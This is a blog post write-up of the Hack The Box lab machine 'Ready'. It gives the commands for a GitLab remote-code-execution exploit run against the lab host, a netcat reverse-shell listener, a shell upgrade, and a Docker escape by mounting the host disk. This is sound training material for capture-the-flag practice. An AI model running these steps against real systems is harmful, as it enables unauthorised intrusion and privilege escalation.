<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>üì¶ HTB - Ready | 0xNinja - My blog</title><meta name=keywords content="htb,writeup"><meta name=description content="Cool box, maybe too easy for a medium? Got reverse shell in minutes, but stuck for root&rsquo;s password for hours üòÖ
 TL;DR Gitlab RCE, get reverse shell. Privesc with cleartext root password, escape Docker to own the box.
Footholds nmap Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-14 16:00 UTC Nmap scan report for 10.10.10.220 Host is up (0.035s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."><meta name=author content="0xNinja"><link rel=canonical href=https://0xninja.fr/posts/htb-ready/><link crossorigin=anonymous href=/assets/css/stylesheet.min.fcb2dfef1f861f508726aa63fad2809727c9d99081a63847ab71ee83ce0d1203.css integrity="sha256-/LLf7x+GH1CHJqpj+tKAlyfJ2ZCBpjhHq3Hug84NEgM=" rel="preload stylesheet" as=style><link rel=icon href=https://0xninja.fr/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://0xninja.fr/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://0xninja.fr/favicon-32x32.png><link rel=apple-touch-icon href=https://0xninja.fr/apple-touch-icon.png><link rel=mask-icon href=https://0xninja.fr/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.98.0"><meta property="og:title" content="üì¶ HTB - Ready"><meta property="og:description" content="Cool box, maybe too easy for a medium? Got reverse shell in minutes, but stuck for root&rsquo;s password for hours üòÖ
 TL;DR Gitlab RCE, get reverse shell. Privesc with cleartext root password, escape Docker to own the box.
Footholds nmap Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-14 16:00 UTC Nmap scan report for 10.10.10.220 Host is up (0.035s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."><meta property="og:type" content="article"><meta property="og:url" content="https://0xninja.fr/posts/htb-ready/"><meta property="og:image" content="https://0xninja.fr/box.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-03-20T10:00:00+00:00"><meta property="article:modified_time" content="2021-03-20T10:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://0xninja.fr/box.png"><meta name=twitter:title content="üì¶ HTB - Ready"><meta name=twitter:description content="Cool box, maybe too easy for a medium? Got reverse shell in minutes, but stuck for root&rsquo;s password for hours üòÖ
 TL;DR Gitlab RCE, get reverse shell. Privesc with cleartext root password, escape Docker to own the box.
Footholds nmap Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-14 16:00 UTC Nmap scan report for 10.10.10.220 Host is up (0.035s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://0xninja.fr/posts/"},{"@type":"ListItem","position":3,"name":"üì¶ HTB - Ready","item":"https://0xninja.fr/posts/htb-ready/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"üì¶ HTB - Ready","name":"üì¶ HTB - Ready","description":"Cool box, maybe too easy for a medium? Got reverse shell in minutes, but stuck for root\u0026rsquo;s password for hours üòÖ\n TL;DR Gitlab RCE, get reverse shell. Privesc with cleartext root password, escape Docker to own the box.\nFootholds nmap Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-14 16:00 UTC Nmap scan report for 10.10.10.220 Host is up (0.035s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.","keywords":["htb","writeup"],"articleBody":" Cool box, maybe too easy for a medium? Got reverse shell in minutes, but stuck for root‚Äôs password for hours üòÖ\n TL;DR Gitlab RCE, get reverse shell. Privesc with cleartext root password, escape Docker to own the box.\nFootholds nmap Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-14 16:00 UTC Nmap scan report for 10.10.10.220 Host is up (0.035s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 5080/tcp open http nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.36 seconds We get an NGINX service running on port 5080, and we know there is a GitLab on it. Let‚Äôs check it out!\nEntrypoint First thing I did was creating an account to see what‚Äôs up with this GitLab. Unfortunately, there is no open projects we can mess with:\nA common reflex here is to check the version of the service, let‚Äôs go to /help:\nThis seems very interesting for us! What do we have for this version?\nWell, we can see there are a lot of exploits in the wild. Let‚Äôs use the first we find: https://github.com/dotPY-hax/gitlab_RCE\n1  python gitlab_rce.py http://ready.htb:5080 10.10.14.28   We follow the instructions, and create a listener with netcat:\nnc -vlnp 42069 Connection from 10.10.10.220:39478 bash: cannot set terminal process group (509): Inappropriate ioctl for device bash: no job control in this shell git@gitlab:~/gitlab-rails/working$ And we got a reverse shell!\nUser Very simple user here:\ngit@gitlab:~$ cat /home/dude/user.txt Upgrade shell We want a good shell here:\ngit@gitlab:~$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' ^Z ninja@null $ stty raw -echo; fg git@gitlab:~$ We want to get root now.\nRoot The classical privesc enumerators, like linenum, linpeas or lse are telling us we are in a Docker container. We will firstly try to get root in the container in order to escape from it later.\nGet root in container Running the enumeration scripts, we get some passwords on the system:\nOf course, there is no way a GitLab SMTP password could be root‚Äôs as well, right?\nEscape the container Now that we are root in the container, it is pretty easy to escape:\nmkdir /tmp/cheh mount /dev/sda2 /tmp/cheh ls /tmp/cheh cat /tmp/cheh/root/root.txt Reference: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#i-own-root\n","wordCount":"427","inLanguage":"en","image":"https://0xninja.fr/box.png","datePublished":"2021-03-20T10:00:00Z","dateModified":"2021-03-20T10:00:00Z","author":{"@type":"Person","name":"0xNinja"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://0xninja.fr/posts/htb-ready/"},"publisher":{"@type":"Organization","name":"0xNinja - My blog","logo":{"@type":"ImageObject","url":"https://0xninja.fr/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><header class=header><nav class=nav><div class=logo><a href=https://0xninja.fr accesskey=h title="0xNinja - My blog (Alt + H)">0xNinja - My blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://0xninja.fr/about/ title="ü•∑ About"><span>ü•∑ About</span></a></li><li><a href=https://0xninja.fr/archives/ title="üìù Archives"><span>üìù Archives</span></a></li><li><a href=https://0xninja.fr/tags/ title="üè∑Ô∏è Tags"><span>üè∑Ô∏è Tags</span></a></li><li><a href=https://0xninja.fr/projects/ title="üî¨ Projects"><span>üî¨ Projects</span></a></li><li><a href=https://0xninja.fr/search/ title="üîé Search (Alt + /)" accesskey=/><span>üîé Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://0xninja.fr>Home</a>&nbsp;¬ª&nbsp;<a href=https://0xninja.fr/posts/>Posts</a></div><h1 class=post-title>üì¶ HTB - Ready</h1><div class=post-meta>March 20, 2021&nbsp;¬∑&nbsp;3 min&nbsp;¬∑&nbsp;0xNinja</div></header><figure class=entry-cover><img loading=lazy srcset="https://0xninja.fr/posts/htb-ready/box_huf77b4b1b86c26a983581065f36f2b825_65135_360x0_resize_box_3.png 360w ,https://0xninja.fr/posts/htb-ready/box_huf77b4b1b86c26a983581065f36f2b825_65135_480x0_resize_box_3.png 480w ,https://0xninja.fr/posts/htb-ready/box_huf77b4b1b86c26a983581065f36f2b825_65135_720x0_resize_box_3.png 720w ,https://0xninja.fr/posts/htb-ready/box.png 986w" sizes="(min-width: 768px) 720px, 100vw" src=https://0xninja.fr/posts/htb-ready/box.png alt></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><div class=details>Table of Contents</div></summary><div class=inner><ul><li><a href=#tldr aria-label=TL;DR>TL;DR</a></li><li><a href=#footholds aria-label=Footholds>Footholds</a><ul><li><a href=#nmap aria-label=nmap>nmap</a></li></ul></li><li><a href=#entrypoint aria-label=Entrypoint>Entrypoint</a></li><li><a href=#user aria-label=User>User</a><ul><li><a href=#upgrade-shell aria-label="Upgrade shell">Upgrade shell</a></li></ul></li><li><a href=#root aria-label=Root>Root</a><ul><li><a href=#get-root-in-container aria-label="Get root in container">Get root in container</a></li><li><a href=#escape-the-container aria-label="Escape the container">Escape the container</a></li></ul></li></ul></div></details></div><div class=post-content><blockquote><p>Cool box, maybe too easy for a medium? Got reverse shell in minutes, but stuck for root&rsquo;s password for hours üòÖ</p></blockquote><h2 id=tldr>TL;DR<a hidden class=anchor aria-hidden=true href=#tldr>#</a></h2><p>Gitlab RCE, get reverse shell. Privesc with cleartext root password, escape Docker to own the box.</p><h2 id=footholds>Footholds<a hidden class=anchor aria-hidden=true href=#footholds>#</a></h2><h3 id=nmap>nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><pre tabindex=0><code>Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-14 16:00 UTC
Nmap scan report for 10.10.10.220
Host is up (0.035s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.36 seconds
</code></pre><p>We get an NGINX service running on port <code>5080</code>, and we know there is a GitLab on it. Let&rsquo;s check it out!</p><h2 id=entrypoint>Entrypoint<a hidden class=anchor aria-hidden=true href=#entrypoint>#</a></h2><p><img loading=lazy src=gitlab.png alt=gitlab.png></p><p>First thing I did was creating an account to see what&rsquo;s up with this GitLab. Unfortunately, there is no open projects we can mess with:</p><p><img loading=lazy src=gitlab_projects.png alt=projetcs.png></p><p>A common reflex here is to check the version of the service, let&rsquo;s go to <code>/help</code>:</p><p><img loading=lazy src=gitlab_version.png alt=version.png></p><p>This seems very interesting for us! What do we have for this version?</p><p><img loading=lazy src=gitlab_vulns.png alt=vulns.png></p><p>Well, we can see there are a lot of exploits in the wild. Let&rsquo;s use the first we find: <a href=https://github.com/dotPY-hax/gitlab_RCE>https://github.com/dotPY-hax/gitlab_RCE</a></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>python gitlab_rce.py http://ready.htb:5080 10.10.14.28
</span></span></code></pre></td></tr></table></div></div><p>We follow the instructions, and create a listener with netcat:</p><pre tabindex=0><code>nc -vlnp 42069 
Connection from 10.10.10.220:39478
bash: cannot set terminal process group (509): Inappropriate ioctl for device
bash: no job control in this shell
git@gitlab:~/gitlab-rails/working$
</code></pre><p>And we got a reverse shell!</p><h2 id=user>User<a hidden class=anchor aria-hidden=true href=#user>#</a></h2><p>Very simple user here:</p><pre tabindex=0><code>git@gitlab:~$ cat /home/dude/user.txt
</code></pre><h3 id=upgrade-shell>Upgrade shell<a hidden class=anchor aria-hidden=true href=#upgrade-shell>#</a></h3><p>We want a good shell here:</p><pre tabindex=0><code>git@gitlab:~$ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
^Z
ninja@null $ stty raw -echo; fg
git@gitlab:~$
</code></pre><p><img loading=lazy src=shell.png alt=shell.png></p><p>We want to get root now.</p><h2 id=root>Root<a hidden class=anchor aria-hidden=true href=#root>#</a></h2><p>The classical privesc enumerators, like <code>linenum</code>, <code>linpeas</code> or <code>lse</code> are telling us we are in a Docker container. We will firstly try to get root in the container in order to escape from it later.</p><h3 id=get-root-in-container>Get root in container<a hidden class=anchor aria-hidden=true href=#get-root-in-container>#</a></h3><p>Running the enumeration scripts, we get some passwords on the system:</p><p><img loading=lazy src=passwords.png alt=passwords.png></p><p>Of course, there is no way a GitLab SMTP password could be root&rsquo;s as well, right?</p><p><img loading=lazy src=glissade.png alt=glissade.png></p><p><img loading=lazy src=https://media.giphy.com/media/3oEhmGVYRFGFLDYSWI/giphy.gif alt></p><h3 id=escape-the-container>Escape the container<a hidden class=anchor aria-hidden=true href=#escape-the-container>#</a></h3><p>Now that we are root in the container, it is pretty easy to escape:</p><pre tabindex=0><code>mkdir /tmp/cheh
mount /dev/sda2 /tmp/cheh
ls /tmp/cheh
cat /tmp/cheh/root/root.txt
</code></pre><p><img loading=lazy src=root.png alt=root.png></p><p>Reference: <a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#i-own-root>https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#i-own-root</a></p><p><img loading=lazy src=rooted.png alt=Rooted></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://0xninja.fr/tags/htb/>htb</a></li><li><a href=https://0xninja.fr/tags/writeup/>writeup</a></li></ul><nav class=paginav><a class=prev href=https://0xninja.fr/posts/free-space-on-disk/><span class=title>¬´ Prev Page</span><br><span>Free space on disk for Linux distros</span></a>
<a class=next href=https://0xninja.fr/posts/sqli-lab/><span class=title>Next Page ¬ª</span><br><span>SQLi lab solutions</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://0xninja.fr>0xNinja - My blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>